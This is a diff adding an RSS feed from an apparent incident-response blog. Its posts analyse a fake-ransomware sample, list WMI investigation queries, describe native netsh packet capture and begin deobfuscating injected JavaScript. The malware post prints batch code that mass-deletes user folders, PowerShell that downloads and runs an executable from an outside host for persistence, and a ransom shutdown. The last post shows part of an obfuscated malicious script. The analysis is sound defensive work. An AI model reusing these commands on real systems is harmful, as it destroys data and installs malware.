@@ -1,0 +1,800 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Tony Latteri</title>
+    <description>VG9ueS5MYXR0ZXJpQEdtYWlsLmNvbQo=</description>
+    <link>http://localhost//</link>
+    <atom:link href="http://localhost//feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Sat, 17 Sep 2016 09:57:40 -0400</pubDate>
+    <lastBuildDate>Sat, 17 Sep 2016 09:57:40 -0400</lastBuildDate>
+    <generator>Jekyll v3.0.2</generator>
+    
+      <item>
+        <title>Malware: A Look Into Fake Cryptoware</title>
+        <description>&lt;p&gt;Ransomware has been picking up what seems to be a lot of attention within the past couple of months, with some adversaries even getting payment from some corporations. During my normal routines I’ve come across a fair amount of variants from Cryptowall, Teslacrypt, Locky, etc. I can now say that I’ve had a chance to look at fake ransomware, and honestly, I have a hard time determining if it’s an amazing idea or just so basic that adversaries lacking experience are able to pull it off.&lt;/p&gt;
+
+&lt;h3 id=&quot;part1&quot;&gt;Part1&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;The initial attack vector was an e-mail with a link which takes you to a download for an executable. When sandboxing the sample, you’re able to determine that some additional files are dropped upon execution, one of which is a .bat file.&lt;/p&gt;
+
+&lt;h3 id=&quot;first-bat-content-cusersuserappdatalocaltempxxxtmpxxxbat&quot;&gt;First .bat content [C:\Users\User\AppData\Local\Temp\XXX.tmp\XXX.bat]&lt;/h3&gt;
+
+&lt;p&gt;Lets break down the first important thing noticed.&lt;/p&gt;
+
+&lt;p&gt;The adversary reverses the right/left-click buttons for the mouse&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;@shift /0
+@ echo off
+rem ---------------------------------
+rem Swap Mouse Buttons
+RUNDLL32 USER32.DLL,SwapMouseButton
+rem ---------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;They then proceed to iterate through some of the folders most likely to contain personal information a end-user would want back, then delete all the items within the folder. I shortened the output, just know that the following folders/drives are impacted.
+Desktop, Documents, Downloads, Pictures, Music, Videos, Contacts, Favorites, Searches, Recycle bin, Temp, A:, B:, D:, E:, F:, G:, H:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;@echo off
+set folder=&quot;%USERPROFILE%\Desktop\*&quot;
+cd /d %folder%
+for /F &quot;delims=&quot; %%i in (&#39;dir /b&#39;) do (rmdir &quot;%%i&quot; /s/q || del &quot;%%i&quot; /s/q)
+
+@echo off
+set folder=&quot;%USERPROFILE%\Documents\*&quot;
+cd /d %folder%
+for /F &quot;delims=&quot; %%i in (&#39;dir /b&#39;) do (rmdir &quot;%%i&quot; /s/q || del &quot;%%i&quot; /s/q)
+
+@echo off
+set folder=&quot;%USERPROFILE%\Downloads\*&quot;
+cd /d %folder%
+for /F &quot;delims=&quot; %%i in (&#39;dir /b&#39;) do (rmdir &quot;%%i&quot; /s/q || del &quot;%%i&quot; /s/q)
+
+@echo off
+set folder=&quot;%USERPROFILE%\Pictures\*&quot;
+cd /d %folder%
+for /F &quot;delims=&quot; %%i in (&#39;dir /b&#39;) do (rmdir &quot;%%i&quot; /s/q || del &quot;%%i&quot; /s/q)
+
+[SNIPPED]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;They proceed to do what I’ll consider a form of calling home. A browser is launched to the web address specified which is currently down, but potentially had an encryption message.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;@echo off
+start &quot;&quot; hXXp://10236.6te.net
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Powershell is then invoked to download some additional files.
+  - First command is used to download the common “your files have been encrypted muahahaha” image. This image is then placed on the users Desktop with the name “Files_Encrypted.jpg”
+  - Second command downloads another executable (we’ll look at this one as well) named “part2.exe” which is then placed to probably the most common persistent point, the startup folder, and renamed to “winrds.exe”.
+  - Third command downloads the instructions on how the end-user can make payment via bitcoin to retrieve the decryption key to restore all their missing files. This file is also conveniently placed on the users Desktop.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;@echo off
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden \\
+(New-Object System.Net.WebClient).DownloadFile(&#39;hXXp://post.eu5.org/anon.jpg&#39;,&#39;%USERPROFILE%\Desktop\Files_Encrypted.jpg&#39;); \\
+cmd /c &#39;%USERPROFILE%\Desktop\Files_Encrypted.jpg&#39;
+
+@echo off
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden \\
+(New-Object System.Net.WebClient).DownloadFile(&#39;hXXps://s3-us-west-2.amazonaws.com/content.tobi/part2.exe&#39;, \\
+&#39;%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\winrds.exe&#39;); cmd /c &#39;%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\winrds.exe&#39;
+
+@echo off
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden \\ 
+(New-Object System.Net.WebClient).DownloadFile(&#39;hXXps://s3-us-west-2.amazonaws.com/content.tobi/payment_instructions.txt&#39;, \\
+&#39;%USERPROFILE%\Desktop\Payment_Info.txt&#39;); cmd /c &#39;%USERPROFILE%\Desktop\Payment_Info.txt&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost/images/fake_crypto.png&quot; alt=&quot;_config.yml&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;part-2&quot;&gt;Part 2&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;second-bat-content-cusersuserappdatalocaltempxxxxbat&quot;&gt;Second .bat content [C:\Users\User\AppData\Local\Temp\~XXXX.bat]&lt;/h3&gt;
+&lt;p&gt;So we saw that a second executable file is retrieved and placed within the Startup folder for persistence. After detonating this second sample, some of the same techniques noticed prior were used again.&lt;/p&gt;
+
+&lt;p&gt;Another .bat files is dropped from the executable which begins by first reversing the mouse buttons again.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;@ echo off
+rem ---------------------------------
+rem Swap Mouse Buttons
+RUNDLL32 USER32.DLL,SwapMouseButton
+rem ---------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;They then try to make sure that the interface is enabled (I suppose they are hoping the end-user is wired with the interface having a default name). IP configuration is renewed with another call out, however to a different page, “i2.html”.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;@echo off
+netsh interface set interface &quot;Local Area Connection&quot; Enable
+timeout /t 10 /nobreak
+
+@Echo off
+Ipconfig /renew
+timeout /t 10 /nobreak
+
+@echo off
+start &quot;&quot; hXXp://10236.6te.net/i2.html
+timeout /t 10 /nobreak
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;They again retrieve the payment instructions and place them on the Desktop.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;@echo off
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden \\
+(New-Object System.Net.WebClient).DownloadFile(&#39;hXXp://post.eu5.org/anon.jpg&#39;,&#39;%USERPROFILE%\Desktop\Payment_Instructions.jpg&#39;); \\
+cmd /c &#39;%USERPROFILE%\Desktop\Payment_Instructions.jpg&#39;
+timeout /t 15 /nobreak
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Hoping the payment info retrieval was successful again, the IP configuration is released and the local interface is disabled. However, they spelled disable wrong (Desable), so the interface doesn’t get turned off.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;@Echo off
+Ipconfig /release
+timeout /t 10 /nobreak
+
+@echo off
+netsh interface set interface &quot;Local Area Connection&quot; Desable
+timeout /t 150 /nobreak
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Last, but certainly not least, the adversary issues a 60 second restart with a message displayed to pay the ransom for file retrievals. And if you need assistance with figuring out how to pay, they have a nice support e-mail address you can contact. Service first!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;C:\Windows\System32\shutdown.exe -s -t 60 -c &quot;Pay Your Ransom to Get Your Files and Computer Back. Shutting Down In 60 Seconds. Email: towerweb@yandex.com for assistance.&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;wrap-up&quot;&gt;Wrap up&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;This is a simple attempt at an adversary using Ransomware with a means to also impersonate itself as Cryptoware. Typically they go hand in hand, but this is a clever fake. All personal files are explicitly deleted from disk, so if an end-user was to actually pay the adversary, no decryption key will be delivered. You’ll have to resort to a file recovery method for the local hard drive. So back to my original thought, is this really better then Cryptoware? The adversary really doesn’t have to stand up an infrastructure for command &amp;amp; control traffic, they don’t have to maintain crypto keys, their malware works quicker then crypto since only deletion is taking place and not rounds of encryption, etc. I really think we’ll be seeing more of these “quick wins” for the adversary within the year as a typical end-user would never know the difference.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 24 May 2016 16:20:35 -0400</pubDate>
+        <link>http://localhost//2016/Malware-A-Look-Into-Fake-Cryptoware/</link>
+        <guid isPermaLink="true">http://localhost//2016/Malware-A-Look-Into-Fake-Cryptoware/</guid>
+        
+        <category>malware</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>WMI: Queries For Incident Response</title>
+        <description>&lt;p&gt;Windows Management Instrumentation, WMI, is a very powerful tool when it comes to doing incident response or general
+investigations related to Windows events.&lt;/p&gt;
+
+&lt;p&gt;Per &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/aa394582(v=vs.85).aspx&quot;&gt;Microsoft&lt;/a&gt;…&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Windows Management Instrumentation (WMI) is the infrastructure for management data and operations on Windows-based operating
+systems. You can write WMI scripts or applications to automate administrative tasks on remote computers but WMI also
+supplies management data to other parts of the operating system and products, for example System Center Operations
+Manager, formerly Microsoft Operations Manager (MOM), or Windows Remote Management (WinRM).&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;setup&quot;&gt;Setup&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;WMI commands are typically executed from a Windows machine, however there is a WMIC client for linux which works pretty well.
+I’m going to make an effort at porting the Windows WMI syntax to the Linux equivalent (and vice versa ) for those that prefer to execute
+incident response activities from that type of environment. Please note that there appears to be an issue, possible memory leak,
+with the WMIC client for Linux. For example, if you attempt to pull a large amount of data (think of historical event logs),
+the Linux WMIC client will crash and only produce partial information. If a large amount of data is being requested,
+it’s best to use a Windows machine.&lt;/p&gt;
+
+&lt;p&gt;Windows:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;WMI should be installed by default on your updated Windows OS.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Linux:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Review the installation instructions located on &lt;a href=&quot;https://www.aldeid.com/wiki/Wmic-linux&quot;&gt;Aldeid.com&lt;/a&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Please take into consideration that the credentials used for the following commands will need to have the appropriate
+administrative permissions to have successful execution.&lt;/p&gt;
+
+&lt;h3 id=&quot;commands&quot;&gt;Commands&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;The following commands are to be executed from within a bash shell or windows command prompt. In a following article, we’ll
+discuss how to create a Python script to automate this process.&lt;/p&gt;
+
+&lt;p&gt;For the Windows command, it’s assumed the user you are currently logged in as has the appropriate permissions to execute remote WMI commands.&lt;/p&gt;
+
+&lt;h4 id=&quot;logged-on-user&quot;&gt;Logged On User&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic /node:(computer ip) path Win32_ComputerSystem&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic -U (domain)\\(account) //(computer ip) &quot;select * from Win32_computersystem&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;check-anti-virus&quot;&gt;Check Anti-Virus&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic /node:(computer ip) /namespace:\\root\\SecurityCenter2 path AntiVirusProduct&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic --namespace=root\\SecurityCenter2 -U (domain)\\(account) //(computer ip) &quot;Select * from AntiVirusProduct&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;check-for-running-processes&quot;&gt;Check For Running Processes&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic /node:(computer ip) process get | findstr /I (executable name)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic --namespace=root\\SecurityCenter2 -U (domain)\\(account) //(computer ip) &quot;Select * from AntiVirusProduct&quot; | grep -i (executable name)&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;installed-updateshotfixes&quot;&gt;Installed Updates/Hotfixes&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic qfe list full /format:htable &amp;gt; C:\hotfixes.htm&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic -U (domain)\\(account) //(computer ip) &#39;Select * from win32_quickfixengineering&#39;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;nic-mac-addresses&quot;&gt;NIC MAC Addresses&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic /node:(computer ip) nic get MACAddress,Description,NetworkAddresses,Manufacturer&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic -U (domain)\\(account) //(computer ip) &quot;Select * from Win32_NetworkAdapterConfiguration&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;mac-times&quot;&gt;MAC Times&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic /node:(computer ip) path cim_datafile where &quot;Drive=&#39;C&#39;&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic -U (domain)\\(account) //(computer ip) &quot;Select LastModified, LastAccessed, CreationDate, InstallDate, FileSize, FileType, Name from cim_datafile where Drive = &#39;C:&#39;&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;pc-restart-event-logs&quot;&gt;PC Restart Event Logs&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic -U (domain)\\(account) //(computer_ip) &quot;Select * from Win32_NTLogEvent where (EventCode=&#39;1074&#39; or EventCode=&#39;6013&#39;) and TimeGenerated &amp;gt;=&#39;20150101000000.000000-000&#39; and TimeGenerated &amp;lt;= &#39;20150106000000.000000-000&#39;&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;successful-login-event-logs&quot;&gt;Successful Login Event Logs&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic -U (domain)\\(account) //(computer ip) &quot;Select InsertionStrings from Win32_NTLogEvent where (EventCode=&#39;4624&#39;) and TimeGenerated &amp;gt;=&#39;20150101000000.000000-000&#39; and TimeGenerated &amp;lt;= &#39;20150106000000.000000-000&#39;&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;remote-pc-time&quot;&gt;Remote PC Time&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic -U (domain)\\(account) //(computer ip) &quot;Select hour,minute,second from win32_localtime&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;list-local-accounts&quot;&gt;List Local Accounts&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic -U (domain)\\(account) //(computer ip) &quot;select * from Win32_UserAccount Where LocalAccount=True&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;list-local-groupsusers&quot;&gt;List Local Groups/Users&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic -U (domain)\\(account) //(computer ip) &quot;select * from Win32_GroupUser&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;operating-system-details-including-hostname&quot;&gt;Operating System Details including Hostname&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic -U (domain)\\(account) //(computer ip) &quot;Select * from Win32_OperatingSystem&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;view-installed-programs&quot;&gt;View Installed Programs&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic /node:(computer ip) product get /format:csv &amp;gt; C:\output.csv&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;execute-remote-commands&quot;&gt;Execute Remote Commands&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wmic /node:(computer ip) process call create &quot;netstat.exe -ano &amp;gt; C:\output.txt&quot;&lt;/code&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 09 Apr 2016 11:30:35 -0400</pubDate>
+        <link>http://localhost//2016/WMI-Queries-For-Incident-Response/</link>
+        <guid isPermaLink="true">http://localhost//2016/WMI-Queries-For-Incident-Response/</guid>
+        
+        <category>wmi</category>
+        
+        <category>windows</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Netsh: Native Windows Packet Capture</title>
+        <description>&lt;p&gt;At some point, you may find yourself in the same shoes I was in and think to yourself “Is it possible to acquire a packet capture on a Windows machine using native tools?”.  It’s not very common that the average end-user is going to have items like Tshark or Tcpdump installed on their box to work with from the command line. So, if you aren’t collecting the neccessary packets through a centralized aggregater and would like to have minimal disturbence on the target machine, what can you do?&lt;/p&gt;
+
+&lt;p&gt;Netsh to the rescue!&lt;/p&gt;
+
+&lt;p&gt;The following is what I went through recently and Rob VandenBrink’s artcile over at the InfoSec Handlers Diary Blog was a fantastic resource.&lt;/p&gt;
+
+&lt;h3 id=&quot;whats-netsh&quot;&gt;What’s Netsh?&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;Aren’t familiar with Netsh? Let’s see what Microsoft has to say about it…&lt;/p&gt;
+
+&lt;p&gt;“Netsh is a command-line scripting utility that allows you to, either locally or remotely, display or modify the network configuration of a computer that is currently running. Netsh also provides a scripting feature that allows you to run a group of commands in batch mode against a specified computer. Netsh can also save a configuration script in a text file for archival purposes or to help you configure other servers.”&lt;/p&gt;
+
+&lt;p&gt;Hmmm, I don’t see anything specifying that it has the ability to create packet captures. Lets take a look at the help options&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\user&amp;gt;netsh /?&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-batch&quot;&gt;Usage: netsh [-a AliasFile] [-c Context] [-r RemoteMachine] [-u [DomainName\]Use
+rName] [-p Password | *] [Command | -f ScriptFile]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The following commands are available:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-batch&quot;&gt;Commands in this context:
+?              - Displays a list of commands.
+add            - Adds a configuration entry to a list of entries.
+advfirewall    - Changes to the netsh advfirewall context.
+branchcache    - Changes to the netsh branchcache context.
+bridge         - Changes to the netsh bridge context.
+delete         - Deletes a configuration entry from a list of entries.
+dhcpclient     - Changes to the `netsh dhcpclient&#39; context.
+dnsclient      - Changes to the netsh dnsclient context.
+dump           - Displays a configuration script.
+exec           - Runs a script file.
+firewall       - Changes to the netsh firewall context.
+help           - Displays a list of commands.
+http           - Changes to the netsh http context.
+interface      - Changes to the netsh interface context.
+ipsec          - Changes to the netsh ipsec context.
+lan            - Changes to the netsh lan context.
+mbn            - Changes to the netsh mbn context.
+namespace      - Changes to the netsh namespace context.
+nap            - Changes to the netsh nap context.
+netio          - Changes to the netsh netio context.
+p2p            - Changes to the netsh p2p context.
+ras            - Changes to the netsh ras context.
+rpc            - Changes to the netsh rpc context.
+set            - Updates configuration settings.
+show           - Displays information.
+trace          - Changes to the netsh trace context.
+wcn            - Changes to the netsh wcn context.
+wfp            - Changes to the netsh wfp context.
+winhttp        - Changes to the netsh winhttp context.
+winsock        - Changes to the netsh winsock context.
+wlan           - Changes to the netsh wlan context.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nothing to obvious, but lets look into the trace option help&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\user&amp;gt;netsh trace /?&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The following commands are available:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-batch&quot;&gt;Commands in this context:
+?              - Displays a list of commands.
+convert        - Converts a trace file to an HTML report.
+correlate      - Normalizes or filters a trace file to a new output file.
+diagnose       - Start a diagnose session.
+dump           - Displays a configuration script.
+help           - Displays a list of commands.
+show           - List interfaces, providers and tracing state.
+start          - Starts tracing.
+stop           - Stops tracing.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Perhaps we’re onto something here. What does microsoft have to say about the trace option for netsh?&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/dd569142(v=vs.85).aspx&quot;&gt;Microsoft Netsh Trace&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;With the trace option, we’re able to specify what type of trace we want, along with additional filters down to what IP addresses are of interest for the capture.&lt;/p&gt;
+
+&lt;p&gt;A full list of capture filters can be obtained with the following.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh trace show capturefilterhelp&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;getting-it-to-run&quot;&gt;Getting It To Run&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;Awesome. Now we need to get it to run on the machine…
+The way I went about it was through the use of PsExec, a great remote admin tool apart of the PsTools suite by Mark Russinovich. I should also note that admin priveledges will be needed to accomplish this.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.exe -accepteula \\\\remoteip\c$ cmd.exe&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that we’re on the machine, lets get a trace going&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh trace start capture=yes Ethernet.Type=IPv4  IPv4.Address=X.X.X.X&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we think we got what we need, lets stop the trace.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh trace stop&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;viewing-what-you-capture&quot;&gt;Viewing What You Capture&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;The output will be in an .ETL format. In order to view it, you must utilize Microsoft’s Message Nalayzer application. As Rob mentions within his post, you can then leverage the export feature to get a PCAP version for Wireshark or TCPDUMP usage.&lt;/p&gt;
+</description>
+        <pubDate>Fri, 26 Feb 2016 13:12:02 -0500</pubDate>
+        <link>http://localhost//2016/Netsh-Native-Windows-Packet-Capture/</link>
+        <guid isPermaLink="true">http://localhost//2016/Netsh-Native-Windows-Packet-Capture/</guid>
+        
+        <category>netsh</category>
+        
+        <category>windows</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>JavaScript: Deobfuscate With Just A Print Function</title>
+        <description>&lt;p&gt;As an incident responder who deals with a lot of exploit kit related events, packet captures are invaluable. If you’re in the same boat, I hope you have pcaps for what triggered the alert, as well as some time on your hands to follow the trail back to the original source and start breaking down what occurred. It’s not uncommon for there to be multiple redirects to the exploit kit landing page, and once the source of the activity is located, you’ll probably be greeted with some nice obfuscated code.&lt;/p&gt;
+
+&lt;p&gt;It’s no surpise that there are multiple ways to redirect users who visit a site, but a common way would be through JavaScript. Below is a sample of the latest malicious JavaScript I’ve come across that was injected into a legitimate webpage.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-obfuscated-code&quot;&gt;The Obfuscated Code&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;The following is what was noticed within the body of a webpage that was visited, right before the closing “&amp;lt;/head&amp;gt;” tag. Typically, malicious code is not formatted in a neat manner, and this case wasn’t any different. To format the output in a more readable format, a great online resource is &lt;a href=&quot;http://jsbeautifier.org/&quot;&gt;jsbeautifier&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&#39;02&#39;02&#39;02&#39;02&#39;1Aqapkrv&#39;1G&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02dwlavkml&#39;02qvpkleEgl&#39;0:ngl&#39;0;&#39;5@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02tcp&#39;02vgzv&#39;02&#39;1F&#39;02&#39;00&#39;00&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02tcp&#39;02ajcpqgv&#39;02&#39;1F&#39;02&#39;00c`afgdejkhinolmrspqvwtuz{x23016745:;&#39;00&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02dmp&#39;0:&#39;02tcp&#39;02k&#39;1F2&#39;1@&#39;02k&#39;02&#39;1A&#39;02ngl&#39;1@&#39;02k))&#39;02&#39;0;&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02vgzv&#39;02)&#39;1F&#39;02ajcpqgv,ajcpCv&#39;0:Ocvj,dnmmp&#39;0:Ocvj,pclfmo&#39;0:&#39;0;&#39;02(&#39;02ajcpqgv,nglevj&#39;0;&#39;0;&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02pgvwpl&#39;02vgzv&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;5F&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02qgvVkogmwv&#39;0:32&#39;0;&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02tcp&#39;02fgdcwnv]ig{umpf&#39;02&#39;1F&#39;02glamfgWPKAmormlglv&#39;0:fmawoglv,vkvng&#39;0;&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02tcp&#39;02qg]pgdgppgp&#39;02&#39;1F&#39;02glamfgWPKAmormlglv&#39;0:fmawoglv,pgdgppgp&#39;0;&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02tcp&#39;02jmqv&#39;02&#39;1F&#39;02glamfgWPKAmormlglv&#39;0:uklfmu,nmacvkml,jmqv&#39;0;&#39;1@&#39;2C&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02&#39;02tcp&#39;02`cqg&#39;02&#39;1F&#39;02&#39;00k,knnwoklcvkmlg